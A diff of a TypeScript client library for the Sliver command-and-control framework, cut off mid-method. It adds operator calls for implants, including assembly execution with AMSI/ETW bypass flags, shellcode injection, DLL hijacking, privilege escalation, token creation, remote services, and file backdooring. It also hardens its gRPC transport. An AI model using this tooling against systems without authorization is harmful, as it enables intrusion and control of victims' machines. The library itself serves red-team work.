@@ -1,4 +1,4 @@
-import { gunzip as gunzipCb, gzip as gzipCb } from "node:zlib";
+import { createGunzip, gzip as gzipCb } from "node:zlib";
 import { promisify } from "node:util";
 
 import { createChannel, createClient, type Channel } from "nice-grpc";
@@ -6,22 +6,34 @@ import { BehaviorSubject, Subject, filter, map, type Observable } from "rxjs";
 
 import type { SliverClientConfig } from "./config";
 import { createSliverRpcCredentials } from "./internal/credentials";
-import { withTimeoutSignal } from "./internal/timeout";
+import { timeoutSecondsToNanoseconds, validateTimeoutSeconds, withTimeoutSignal } from "./internal/timeout";
 import { TunnelManager } from "./internal/tunnelManager";
 import { hasWireGuardWrapper, startWireGuardProxy, type WireGuardProxySession } from "./internal/wgProxy";
-import { BeaconTask } from "./pb/clientpb/client";
+import {
+  RPC_MESSAGE_BUDGETS,
+  RPC_MESSAGE_DOMAINS,
+  TUNNEL_STREAM_MAX_PAYLOAD_BYTES,
+  WORKBENCH_ARTIFACT_MAX_PAYLOAD_BYTES,
+  rpcMessageChannelOptions,
+  rpcTlsAuthorityOverride,
+  type RpcMessageDomain,
+} from "./messageBudget";
+import { BeaconTask, ImplantConfig, ShellcodeEncoder } from "./pb/clientpb/client";
 import type {
+  BeaconTasks,
   Event,
+  Operator,
   Operators,
+  Session,
   Sessions,
   Version,
   Beacons,
   Jobs,
   Beacon,
   GenerateSpoofMetadataReq,
-  ImplantConfig,
   ImplantProfile,
   Loot,
+  Credential,
   WebContent,
   Compiler,
   Generate,
@@ -30,18 +42,39 @@ import type {
   StagerListenerReq,
   UniqueWGIP,
 } from "./pb/clientpb/client";
-import type { Request as CommonRequest } from "./pb/commonpb/common";
+import type { Empty, Request as CommonRequest } from "./pb/commonpb/common";
 import { SliverRPCDefinition } from "./pb/rpcpb/services";
 import type { SliverRPCClient } from "./pb/rpcpb/services";
-import { Ls } from "./pb/sliverpb/sliver";
+import { Ls, RegistryType } from "./pb/sliverpb/sliver";
+import type {
+  EnvInfo,
+  OpenSession,
+  Ping,
+  Reconfigure,
+  SetEnv,
+  UnsetEnv,
+} from "./pb/sliverpb/sliver";
 
 const gzip = promisify(gzipCb);
-const gunzip = promisify(gunzipCb);
 
 const DEFAULT_TIMEOUT_SECONDS = 30;
-const KiB = 1024;
-const MiB = 1024 * KiB;
-const GiB = 1024 * MiB;
+const M4_DEFAULT_TIMEOUT_SECONDS = 60;
+const M4_IDENTITY_TIMEOUT_SECONDS = 30;
+const M4_SECRET_MAX_PAYLOAD_BYTES = 1024 * 1024;
+const M4_IMPLANT_CONFIG_MAX_BYTES = 4 * 1024 * 1024;
+const M4_IMPLANT_CONFIG_MAX_ASSETS = 128;
+const M4_IMPLANT_CONFIG_MAX_C2 = 64;
+const M4_IMPLANT_CONFIG_MAX_CANARY_DOMAINS = 256;
+const M4_IMPLANT_CONFIG_MAX_EXPORTS = 1_024;
+const M4_IMPLANT_CONFIG_MAX_TRAFFIC_ENCODERS = 128;
+const REGISTRY_VALUE_MAX_BYTES = 4 * 1024 * 1024;
+const M4_REMOTE_HOSTNAME_MAX_CHARACTERS = 255;
+const M4_REMOTE_SERVICE_NAME_MAX_CHARACTERS = 256;
+const M4_REMOTE_SERVICE_DESCRIPTION_MAX_CHARACTERS = 4_096;
+const M4_REMOTE_COMMAND_LINE_MAX_CHARACTERS = 32_767;
+const CREDENTIAL_ID_MAX_CHARACTERS = 64;
+const CREDENTIAL_METADATA_MAX_CHARACTERS = 256;
+const CREDENTIAL_SECRET_MAX_BYTES = 64 * 1024;
 const EVENT_RETRY_INITIAL_MS = 500;
 const EVENT_RETRY_MAX_MS = 10_000;
 
@@ -68,18 +101,234 @@ export interface HTTPSListenerOptions extends HTTPListenerOptions {
   randomizeJARM?: boolean;
 }
 
+export interface BeaconReconfigureOptions {
+  reconnectIntervalNanoseconds?: string;
+  intervalNanoseconds?: string;
+  jitterNanoseconds?: string;
+  c2Uri?: string;
+}
+
+export interface SessionNetstatOptions {
+  tcp: boolean;
+  udp: boolean;
+  ip4: boolean;
+  ip6: boolean;
+  listening: boolean;
+}
+
+export interface SessionDownloadFileOptions {
+  start?: number;
+  stop?: number;
+  maxBytes?: number;
+  maxLines?: number;
+  /** Read the bounded byte window from the end of the file. */
+  fromEnd?: boolean;
+}
+
+export interface SessionUploadOptions {
+  isIOC?: boolean;
+  fileName?: string;
+  isDirectory?: boolean;
+  overwrite?: boolean;
+}
+
+export interface SessionGrepOptions {
+  recursive?: boolean;
+  linesBefore?: number;
+  linesAfter?: number;
+}
+
+export type SessionRegistryWriteValue =
+  | { type: "binary"; value: Buffer }
+  | { type: "string"; value: string }
+  | { type: "dword"; value: number }
+  | { type: "qword"; value: string };
+
+export interface ExecuteOptions {
+  path: string;
+  args?: string[];
+  output?: boolean;
+  background?: boolean;
+  stdoutPath?: string;
+  stderrPath?: string;
+  envInheritance?: boolean;
+  env?: Readonly<Record<string, string>>;
+  useToken?: boolean;
+  hideWindow?: boolean;
+  parentPid?: number;
+}
+
+export interface ExecuteAssemblyOptions {
+  arguments?: string[];
+  process?: string;
+  isDll?: boolean;
+  arch?: string;
+  className?: string;
+  method?: string;
+  appDomain?: string;
+  parentPid?: number;
+  processArgs?: string[];
+  inProcess?: boolean;
+  runtime?: string;
+  amsiBypass?: boolean;
+  etwBypass?: boolean;
+}
+
+export interface ExecuteShellcodeOptions {
+  pid?: number;
+  rwxPages?: boolean;
+}
+
+export interface SideloadOptions {
+  processName?: string;
+  args?: string[];
+  entryPoint?: string;
+  keepAlive?: boolean;
+  isDll?: boolean;
+  isUnicode?: boolean;
+  parentPid?: number;
+  processArgs?: string[];
+}
+
+export interface SpawnDllOptions {
+  processName?: string;
+  args?: string[];
+  entryPoint?: string;
+  keepAlive?: boolean;
+}
+
+export interface MigrateOptions {
+  pid?: number;
+  processName?: string;
+  config: ImplantConfig;
+  encoder?: ShellcodeEncoder;
+  name: string;
+}
+
+export interface MsfOptions {
+  payload?: string;
+  lhost: string;
+  lport?: number;
+  encoder?: string;
+  iterations?: number;
+}
+
+export interface MsfRemoteOptions extends MsfOptions {
+  pid: number;
+}
+
+export interface SshCommandOptions {
+  username: string;
+  hostname: string;
+  port?: number;
+  command?: string | string[];
+  password?: string;
+  privateKey?: Buffer;
+  kerberosConfigPath?: string;
+  kerberosKeytab?: Buffer;
+  kerberosRealm?: string;
+}
+
+export interface StartRemoteServiceOptions {
+  hostname: string;
+  serviceName: string;
+  serviceDescription: string;
+  binaryPath: string;
+  args?: string;
+}
+
+export interface RemoveRemoteServiceOptions {
+  hostname: string;
+  serviceName: string;
+}
+
+export interface RunAsOptions {
+  username: string;
+  processName: string;
+  args?: string;
+  domain?: string;
+  password?: string;
+  showWindow?: boolean;
+  netOnly?: boolean;
+}
+
+export type WindowsLogonType = 2 | 3 | 4 | 5 | 7 | 8 | 9;
+
+export interface MakeTokenOptions {
+  username: string;
+  password: string;
+  domain?: string;
+  logonType?: WindowsLogonType;
+}
+
+export interface GetSystemOptions {
+  config: ImplantConfig;
+  hostingProcess?: string;
+}
+
+export interface BackdoorOptions {
+  filePath: string;
+  profileName?: string;
+  name?: string;
+}
+
+export interface HijackDllOptions {
+  referenceDllPath: string;
+  targetLocation: string;
+  referenceDll?: Buffer;
+  targetDll?: Buffer;
+  profileName?: string;
+  name?: string;
+}
+
 export interface Tunnel {
   readonly id: string;
   readonly stdout$: Observable<Buffer>;
-  write(data: Buffer | string): void;
+  write(data: Buffer | string): Promise<void>;
+  close(): Promise<void>;
+}
+
+export const SHELL_OUTPUT_BUFFER_DEFAULT_BYTES = 512 * 1024;
+export const SHELL_OUTPUT_BUFFER_MAX_BYTES = 4 * 1024 * 1024;
+export const SHELL_WRITE_MAX_BYTES = 4 * 1024 * 1024;
+export const SHELL_TERMINAL_DIMENSION_MAX = 1_000;
+export const SHELL_GRACEFUL_CLOSE_TIMEOUT_MILLISECONDS = 2_000;
+const SHELL_WRITE_MAX_PENDING_OPERATIONS = 8;
+
+export interface ShellSessionOptions {
+  readonly path: string;
+  readonly pty: boolean;
+  readonly rows: number;
+  readonly cols: number;
+  readonly outputBufferBytes?: number;
+}
+
+/** Main-process-only handle for one managed session shell. */
+export interface ShellSessionHandle {
+  readonly id: string;
+  readonly pid: number;
+  readonly path: string;
+  readonly ptyRequested: boolean;
+  readonly output: AsyncIterable<Uint8Array>;
+  write(chunk: Uint8Array | string): Promise<void>;
+  resize(rows: number, cols: number): Promise<void>;
   close(): Promise<void>;
 }
 
 class BaseCommands {
-  constructor(protected readonly rpc: SliverRPCClient) {}
+  constructor(
+    protected readonly rpc: SliverRPCClient,
+    protected readonly artifactRpc: SliverRPCClient = rpc,
+    protected readonly responseArtifactRpc: SliverRPCClient = artifactRpc,
+  ) {}
 
   protected request(timeoutSeconds: number): CommonRequest {
-    return { Async: false, Timeout: `${timeoutSeconds}`, BeaconID: "", SessionID: "" };
+    return {
+      Async: false,
+      Timeout: timeoutSecondsToNanoseconds(timeoutSeconds),
+      BeaconID: "",
+      SessionID: "",
+    };
   }
 
   protected async unary<T>(timeoutSeconds: number, fn: (signal: AbortSignal) => Promise<T>): Promise<T> {
@@ -106,25 +355,48 @@ class BaseCommands {
 
   download(path: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Buffer> {
     return this.unary(timeoutSeconds, async (signal) => {
-      const download = await this.rpc.download({ Path: path, Request: this.request(timeoutSeconds) }, { signal });
-      if (download.Encoder === "gzip") {
-        return await gunzip(download.Data);
+      const download = await this.artifactRpc.download(
+        { Path: path, Request: this.request(timeoutSeconds) },
+        { signal },
+      );
+      try {
+        assertImplantResponse(download.Response?.Err, "Download");
+        if (!download.Exists || download.IsDir) {
+          throw new Error("Download is unavailable or is not a single file");
+        }
+        return await decodeBoundedEncodedBytes(
+          download.Data,
+          download.Encoder,
+          RPC_MESSAGE_BUDGETS.artifact.maxReceiveBytes,
+          "Download",
+        );
+      } catch (error) {
+        download.Data.fill(0);
+        throw error;
       }
-      if (download.Encoder !== "") {
-        throw new Error(`Unsupported encoder: ${download.Encoder}`);
-      }
-      return download.Data;
     });
   }
 
   upload(path: string, data: Buffer, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    if (!Buffer.isBuffer(data)) throw new Error("Upload data must be bytes");
+    assertBoundedArtifact(data, "Upload");
+    const ownedData = Buffer.from(data);
     return this.unary(timeoutSeconds, async (signal) => {
-      const payload = await gzip(data);
-      return this.rpc.upload(
-        { Path: path, Encoder: "gzip", Data: payload, Request: this.request(timeoutSeconds) },
-        { signal },
-      );
-    });
+      let payload: Buffer;
+      try {
+        payload = await gzip(ownedData);
+      } finally {
+        ownedData.fill(0);
+      }
+      try {
+        return await this.artifactRpc.upload(
+          { Path: path, Encoder: "gzip", Data: payload, Request: this.request(timeoutSeconds) },
+          { signal },
+        );
+      } finally {
+        payload.fill(0);
+      }
+    }).finally(() => ownedData.fill(0));
   }
 
   terminate(pid: number, force = false, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
@@ -167,7 +439,7 @@ class BaseCommands {
 
   processDump(pid: number, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
     return this.unary(timeoutSeconds, (signal) =>
-      this.rpc.processDump({ Pid: pid, Request: this.request(timeoutSeconds) }, { signal }),
+      this.artifactRpc.processDump({ Pid: pid, Request: this.request(timeoutSeconds) }, { signal }),
     );
   }
 
@@ -213,7 +485,7 @@ class BaseCommands {
     timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
   ) {
     return this.unary(timeoutSeconds, (signal) =>
-      this.rpc.task(
+      this.artifactRpc.task(
         {
           Pid: pid,
           Data: shellcode,
@@ -261,7 +533,7 @@ class BaseCommands {
 
   executeAssembly(assembly: Buffer, args: string[] = [], process = "", timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
     return this.unary(timeoutSeconds, (signal) =>
-      this.rpc.executeAssembly(
+      this.artifactRpc.executeAssembly(
         { Assembly: assembly, Arguments: args, Process: process, Request: this.request(timeoutSeconds) },
         { signal },
       ),
@@ -275,8 +547,10 @@ class BaseCommands {
   }
 
   execute(exe: string, args: string[] = [], output = true, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    const request = this.request(timeoutSeconds);
+    const rpc = !request.Async && output ? this.responseArtifactRpc : this.rpc;
     return this.unary(timeoutSeconds, (signal) =>
-      this.rpc.execute({ Path: exe, Args: args, Output: output, Request: this.request(timeoutSeconds) }, { signal }),
+      rpc.execute({ Path: exe, Args: args, Output: output, Request: request }, { signal }),
     );
   }
 
@@ -288,7 +562,7 @@ class BaseCommands {
     timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
   ) {
     return this.unary(timeoutSeconds, (signal) =>
-      this.rpc.sideload(
+      this.artifactRpc.sideload(
         { Data: data, ProcessName: processName, Args: args, EntryPoint: entryPoint, Request: this.request(timeoutSeconds) },
         { signal },
       ),
@@ -303,7 +577,7 @@ class BaseCommands {
     timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
   ) {
     return this.unary(timeoutSeconds, (signal) =>
-      this.rpc.spawnDll(
+      this.artifactRpc.spawnDll(
         { Data: data, EntryPoint: entrypoint, ProcessName: processName, Args: args, Request: this.request(timeoutSeconds) },
         { signal },
       ),
@@ -312,24 +586,57 @@ class BaseCommands {
 
   screenshot(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
     return this.unary(timeoutSeconds, (signal) =>
-      this.rpc.screenshot({ Request: this.request(timeoutSeconds) }, { signal }),
+      this.artifactRpc.screenshot({ Request: this.request(timeoutSeconds) }, { signal }),
     );
   }
 }
 
 export class InteractiveBeacon extends BaseCommands {
+  private readonly taskResult$: Observable<Event>;
+  private readonly beaconId: string;
+  private readonly taskContentRpc: SliverRPCClient;
+
+  constructor(rpc: SliverRPCClient, taskResult$: Observable<Event>, beaconId: string);
   constructor(
     rpc: SliverRPCClient,
-    private readonly taskResult$: Observable<Event>,
-    private readonly beaconId: string,
+    artifactRpc: SliverRPCClient,
+    taskResult$: Observable<Event>,
+    beaconId: string,
+  );
+  constructor(
+    rpc: SliverRPCClient,
+    artifactRpc: SliverRPCClient,
+    taskContentRpc: SliverRPCClient,
+    taskResult$: Observable<Event>,
+    beaconId: string,
+  );
+  constructor(
+    rpc: SliverRPCClient,
+    artifactRpcOrTaskResults: SliverRPCClient | Observable<Event>,
+    taskContentRpcOrTaskResultsOrBeaconId: SliverRPCClient | Observable<Event> | string,
+    taskResultsOrBeaconId?: Observable<Event> | string,
+    explicitBeaconId?: string,
   ) {
-    super(rpc);
+    const usingDedicatedTaskContentClient = explicitBeaconId !== undefined;
+    const usingSeparateArtifactClient = taskResultsOrBeaconId !== undefined;
+    const artifactRpc = usingSeparateArtifactClient ? artifactRpcOrTaskResults as SliverRPCClient : rpc;
+    super(rpc, artifactRpc);
+    this.taskContentRpc = usingDedicatedTaskContentClient
+      ? taskContentRpcOrTaskResultsOrBeaconId as SliverRPCClient
+      : artifactRpc;
+    this.taskResult$ = (usingDedicatedTaskContentClient
+      ? taskResultsOrBeaconId
+      : usingSeparateArtifactClient
+        ? taskContentRpcOrTaskResultsOrBeaconId
+        : artifactRpcOrTaskResults) as Observable<Event>;
+    this.beaconId = explicitBeaconId
+      ?? (usingSeparateArtifactClient ? taskResultsOrBeaconId : taskContentRpcOrTaskResultsOrBeaconId) as string;
   }
 
   protected request(timeoutSeconds: number): CommonRequest {
     return {
       Async: true,
-      Timeout: `${timeoutSeconds}`,
+      Timeout: timeoutSecondsToNanoseconds(timeoutSeconds),
       BeaconID: this.beaconId,
       SessionID: "",
     };
@@ -349,7 +656,7 @@ export class InteractiveBeacon extends BaseCommands {
       wait: async (waitTimeoutSeconds = timeoutSeconds) => {
         const beaconTask = await waitForBeaconTask(this.taskResult$, taskId, waitTimeoutSeconds);
         const taskContent = await this.unary(waitTimeoutSeconds, (signal) =>
-          this.rpc.getBeaconTaskContent({ ID: beaconTask.ID }, { signal }),
+          this.taskContentRpc.getBeaconTaskContent({ ID: beaconTask.ID }, { signal }),
         );
         return Ls.decode(taskContent.Response);
       },
@@ -363,18 +670,50 @@ export class InteractiveBeacon extends BaseCommands {
 }
 
 export class InteractiveSession extends BaseCommands {
+  private readonly tunnels: TunnelManager;
+  private readonly sessionId: string;
+
+  constructor(rpc: SliverRPCClient, tunnels: TunnelManager, sessionId: string);
   constructor(
     rpc: SliverRPCClient,
-    private readonly tunnels: TunnelManager,
-    private readonly sessionId: string,
+    artifactRpc: SliverRPCClient,
+    tunnels: TunnelManager,
+    sessionId: string,
+  );
+  constructor(
+    rpc: SliverRPCClient,
+    artifactRpc: SliverRPCClient,
+    responseArtifactRpc: SliverRPCClient,
+    tunnels: TunnelManager,
+    sessionId: string,
+  );
+  constructor(
+    rpc: SliverRPCClient,
+    artifactRpcOrTunnels: SliverRPCClient | TunnelManager,
+    responseArtifactRpcOrTunnelsOrSessionId: SliverRPCClient | TunnelManager | string,
+    tunnelsOrSessionId?: TunnelManager | string,
+    explicitSessionId?: string,
   ) {
-    super(rpc);
+    const usingResponseArtifactClient = explicitSessionId !== undefined;
+    const usingSeparateArtifactClient = tunnelsOrSessionId !== undefined;
+    const artifactRpc = usingSeparateArtifactClient ? artifactRpcOrTunnels as SliverRPCClient : rpc;
+    const responseArtifactRpc = usingResponseArtifactClient
+      ? responseArtifactRpcOrTunnelsOrSessionId as SliverRPCClient
+      : artifactRpc;
+    super(rpc, artifactRpc, responseArtifactRpc);
+    this.tunnels = (usingResponseArtifactClient
+      ? tunnelsOrSessionId
+      : usingSeparateArtifactClient
+        ? responseArtifactRpcOrTunnelsOrSessionId
+        : artifactRpcOrTunnels) as TunnelManager;
+    this.sessionId = explicitSessionId
+      ?? (usingSeparateArtifactClient ? tunnelsOrSessionId : responseArtifactRpcOrTunnelsOrSessionId) as string;
   }
 
   protected request(timeoutSeconds: number): CommonRequest {
     return {
       Async: false,
-      Timeout: `${timeoutSeconds}`,
+      Timeout: timeoutSecondsToNanoseconds(timeoutSeconds),
       BeaconID: "",
       SessionID: this.sessionId,
     };
@@ -396,30 +735,93 @@ export class InteractiveSession extends BaseCommands {
       map((msg) => msg.Data),
     );
 
-    // Bind tunnel to the tunnel stream.
-    this.tunnels.send({ TunnelID: tunnelId, SessionID: this.sessionId });
+    let writeTail: Promise<void> = Promise.resolve();
+    let pendingWriteOperations = 0;
+    let pendingWriteBytes = 0;
 
-    // Ask the implant to open a shell on the bound tunnel.
-    await this.unary(timeoutSeconds, (signal) =>
-      this.rpc.shell(
-        {
-          Path: path,
-          EnablePTY: pty,
-          TunnelID: tunnelId,
-          Request: this.request(timeoutSeconds),
-        },
-        { signal },
-      ),
-    );
+    const rejectedWrite = (error: unknown): Promise<never> => {
+      const rejected = Promise.reject(error);
+      void rejected.catch(() => undefined);
+      return rejected;
+    };
+
+    try {
+      // Bind tunnel to the tunnel stream.
+      await this.tunnels.send({
+        TunnelID: tunnelId,
+        SessionID: this.sessionId,
+        Data: Buffer.alloc(0),
+      });
+
+      // Ask the implant to open a shell on the bound tunnel.
+      const shell = await this.unary(timeoutSeconds, (signal) =>
+        this.rpc.shell(
+          {
+            Path: path,
+            EnablePTY: pty,
+            Pid: 0,
+            Rows: 0,
+            Cols: 0,
+            TunnelID: tunnelId,
+            Request: this.request(timeoutSeconds),
+          },
+          { signal },
+        ),
+      );
+      if (shell.Response?.Err) throw new Error("Shell was rejected by the target");
+    } catch {
+      this.tunnels.cancelTunnel(tunnelId);
+      await this.unary(DEFAULT_TIMEOUT_SECONDS, (signal) =>
+        this.rpc.closeTunnel({ TunnelID: tunnelId, SessionID: this.sessionId }, { signal }),
+      ).catch(() => undefined);
+      throw new Error("Unable to start shell session");
+    }
 
     return {
       id: tunnelId,
       stdout$,
       write: (data: Buffer | string) => {
-        const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
-        this.tunnels.send({ TunnelID: tunnelId, SessionID: this.sessionId, Data: buf });
+        let bytes: Buffer;
+        try {
+          bytes = shellWriteBytes(data);
+        } catch (error) {
+          return rejectedWrite(error);
+        }
+        const writeCost = Math.max(bytes.length, 1);
+        if (
+          pendingWriteOperations >= SHELL_WRITE_MAX_PENDING_OPERATIONS
+          || pendingWriteBytes + writeCost > SHELL_WRITE_MAX_BYTES
+        ) {
+          bytes.fill(0);
+          return rejectedWrite(new Error("Shell write exceeded its bounded queue"));
+        }
+        pendingWriteOperations += 1;
+        pendingWriteBytes += writeCost;
+        const operation = writeTail.then(async () => {
+          try {
+            for (let offset = 0; offset < bytes.length; offset += TUNNEL_STREAM_MAX_PAYLOAD_BYTES) {
+              await this.tunnels.send({
+                TunnelID: tunnelId,
+                SessionID: this.sessionId,
+                Data: bytes.subarray(offset, offset + TUNNEL_STREAM_MAX_PAYLOAD_BYTES),
+              });
+            }
+          } catch {
+            throw new Error("Unable to write to shell session");
+          } finally {
+            bytes.fill(0);
+            pendingWriteOperations -= 1;
+            pendingWriteBytes -= writeCost;
+          }
+        });
+        // v1 callers treated write() as fire-and-forget. Keep the returned
+        // promise observable to newer callers without creating an unhandled
+        // rejection when an older caller ignores it.
+        writeTail = operation.catch(() => undefined);
+        return operation;
       },
       close: async () => {
+        this.tunnels.cancelTunnel(tunnelId);
         await this.unary(DEFAULT_TIMEOUT_SECONDS, (signal) =>
           this.rpc.closeTunnel({ TunnelID: tunnelId, SessionID: this.sessionId }, { signal }),
         );
@@ -433,12 +835,13 @@ export class SliverClient {
   static readonly EVENT_BEACON_TASKRESULT = "beacon-taskresult";
 
   private readonly empty = {};
-  private rpcClient: SliverRPCClient | null = null;
-  private channel: Channel | null = null;
+  private readonly rpcClients: Partial<Record<RpcMessageDomain, SliverRPCClient>> = {};
+  private readonly channels: Partial<Record<RpcMessageDomain, Channel>> = {};
 
   private eventsAbort: AbortController | null = null;
   private tunnels: TunnelManager | null = null;
   private wireGuardProxy: WireGuardProxySession | null = null;
+  private lifecycleTail: Promise<void> = Promise.resolve();
 
   private readonly eventSubject = new Subject<Event>();
   readonly event$ = this.eventSubject.asObservable();
@@ -467,33 +870,76 @@ export class SliverClient {
     return `${this.config.lhost}:${this.config.lport}`;
   }
 
-  private rpcChannelOptions(): Record<string, number | string> {
-    const options: Record<string, number | string> = {
-      "grpc.max_send_message_length": (2 * GiB) - 1,
-      "grpc.max_receive_message_length": (2 * GiB) - 1,
-    };
-
-    if (this.wireGuardProxy) {
-      options["grpc.ssl_target_name_override"] = this.config.lhost;
-      options["grpc.default_authority"] = this.config.lhost;
-    }
-
-    return options;
+  private clientFor(domain: RpcMessageDomain): SliverRPCClient {
+    const client = this.rpcClients[domain];
+    if (!client) throw new Error("SliverClient is not connected");
+    return client;
   }
 
   get rpc(): SliverRPCClient {
-    if (!this.rpcClient) {
-      throw new Error("SliverClient is not connected");
-    }
-    return this.rpcClient;
+    return this.clientFor("control");
+  }
+
+  private get inventoryRpc(): SliverRPCClient {
+    return this.clientFor("inventory");
+  }
+
+  private get artifactRpc(): SliverRPCClient {
+    return this.clientFor("artifact");
+  }
+
+  private get workbenchArtifactRpc(): SliverRPCClient {
+    return this.clientFor("workbench-artifact");
+  }
+
+  private get taskContentRpc(): SliverRPCClient {
+    return this.clientFor("task-content");
+  }
+
+  private sessionRequest(sessionId: string, timeoutSeconds: number): CommonRequest {
+    return {
+      Async: false,
+      Timeout: timeoutSecondsToNanoseconds(timeoutSeconds),
+      BeaconID: "",
+      SessionID: sessionId,
+    };
+  }
+
+  private beaconRequest(beaconId: string, timeoutSeconds: number): CommonRequest {
+    return {
+      Async: true,
+      Timeout: timeoutSecondsToNanoseconds(timeoutSeconds),
+      BeaconID: beaconId,
+      SessionID: "",
+    };
+  }
+
+  private m4SessionRequest(sessionId: string, timeoutSeconds: number): CommonRequest {
+    assertNonEmptyString(sessionId, "Session id");
+    return this.sessionRequest(sessionId, timeoutSeconds);
+  }
+
+  private m4BeaconRequest(beaconId: string, timeoutSeconds: number): CommonRequest {
+    assertNonEmptyString(beaconId, "Beacon id");
+    return this.beaconRequest(beaconId, timeoutSeconds);
   }
 
   get isConnected(): boolean {
-    return this.rpcClient !== null;
+    return this.rpcClients.control !== undefined;
   }
 
-  async connect(): Promise<this> {
-    if (this.rpcClient) return this;
+  private enqueueLifecycle<T>(operation: () => Promise<T>): Promise<T> {
+    const result = this.lifecycleTail.then(operation, operation);
+    this.lifecycleTail = result.then(() => undefined, () => undefined);
+    return result;
+  }
+
+  connect(): Promise<this> {
+    return this.enqueueLifecycle(() => this.connectUnlocked());
+  }
+
+  private async connectUnlocked(): Promise<this> {
+    if (this.rpcClients.control) return this;
 
     this.eventsAbort = new AbortController();
     this.tunnels = new TunnelManager();
@@ -505,33 +951,46 @@ export class SliverClient {
         rpcTarget = this.wireGuardProxy.rpcHost();
       }
 
-      const creds = createSliverRpcCredentials(this.config);
-      this.channel = createChannel(rpcTarget, creds, this.rpcChannelOptions());
-
-      this.rpcClient = createClient(SliverRPCDefinition, this.channel);
+      const credentials = createSliverRpcCredentials(this.config);
+      for (const domain of RPC_MESSAGE_DOMAINS) {
+        const authorityOverride = rpcTlsAuthorityOverride(this.config.lhost, this.wireGuardProxy !== null);
+        const channel = createChannel(
+          rpcTarget,
+          credentials,
+          rpcMessageChannelOptions(domain, authorityOverride),
+        );
+        this.channels[domain] = channel;
+        this.rpcClients[domain] = createClient(SliverRPCDefinition, channel);
+      }
 
       // Ensure auth and connectivity are working before we start streams.
       await this.getVersion();
 
-      this.tunnels.start(this.rpcClient);
+      this.tunnels.start(this.clientFor("tunnel-stream"));
       this.startEventsStream();
       return this;
     } catch (error) {
-      await this.disconnect();
+      await this.disconnectUnlocked();
       throw error;
     }
   }
 
-  async disconnect(): Promise<void> {
+  disconnect(): Promise<void> {
+    return this.enqueueLifecycle(() => this.disconnectUnlocked());
+  }
+
+  private async disconnectUnlocked(): Promise<void> {
     this.eventsAbort?.abort();
     this.eventsAbort = null;
 
     await this.tunnels?.stop();
     this.tunnels = null;
 
-    this.rpcClient = null;
-    this.channel?.close();
-    this.channel = null;
+    for (const domain of RPC_MESSAGE_DOMAINS) {
+      delete this.rpcClients[domain];
+      this.channels[domain]?.close();
+      delete this.channels[domain];
+    }
 
     const wireGuardProxy = this.wireGuardProxy;
     this.wireGuardProxy = null;
@@ -541,14 +1000,14 @@ export class SliverClient {
   }
 
   private startEventsStream(): void {
-    const rpc = this.rpcClient;
+    const rpc = this.rpcClients.control;
     const abort = this.eventsAbort;
     if (!rpc || !abort) return;
 
     (async () => {
       let attempt = 0;
 
-      while (!abort.signal.aborted && this.rpcClient === rpc) {
+      while (!abort.signal.aborted && this.rpcClients.control === rpc) {
         this.eventStreamStateSubject.next({
           status: attempt === 0 ? "connecting" : "retrying",
           attempt,
@@ -556,10 +1015,14 @@ export class SliverClient {
 
         try {
           const stream = rpc.events(this.empty, { signal: abort.signal });
-          this.eventStreamStateSubject.next({ status: "connected", attempt });
-          attempt = 0;
+          let established = false;
 
           for await (const event of stream) {
+            if (!established) {
+              established = true;
+              this.eventStreamStateSubject.next({ status: "connected", attempt });
+              attempt = 0;
+            }
             this.eventSubject.next(event);
           }
 
@@ -568,7 +1031,7 @@ export class SliverClient {
           }
         } catch (err) {
           // Abort is expected on disconnect; don't surface it as a retry.
-          if (abort.signal.aborted || this.rpcClient !== rpc) {
+          if (abort.signal.aborted || this.rpcClients.control !== rpc) {
             return;
           }
 
@@ -597,11 +1060,1471 @@ export class SliverClient {
   }
 
   getSessions(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Sessions> {
-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.getSessions(this.empty, { signal }));
+    return withTimeoutSignal(timeoutSeconds, (signal) => this.inventoryRpc.getSessions(this.empty, { signal }));
   }
 
   getBeacons(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Beacons> {
-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.getBeacons(this.empty, { signal }));
+    return withTimeoutSignal(timeoutSeconds, (signal) => this.inventoryRpc.getBeacons(this.empty, { signal }));
+  }
+
+  renameSession(sessionId: string, name: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Empty> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.rename({ SessionID: sessionId, BeaconID: "", Name: name }, { signal }),
+    );
+  }
+
+  renameBeacon(beaconId: string, name: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Empty> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.rename({ SessionID: "", BeaconID: beaconId, Name: name }, { signal }),
+    );
+  }
+
+  pingSession(sessionId: string, nonce: number, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Ping> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.ping(
+        { Nonce: nonce, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  pingBeacon(beaconId: string, nonce: number, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Ping> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.ping(
+        { Nonce: nonce, Request: this.beaconRequest(beaconId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  getEnvSession(sessionId: string, name = "", timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<EnvInfo> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.getEnv(
+        { Name: name, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  getEnvBeacon(beaconId: string, name = "", timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<EnvInfo> {
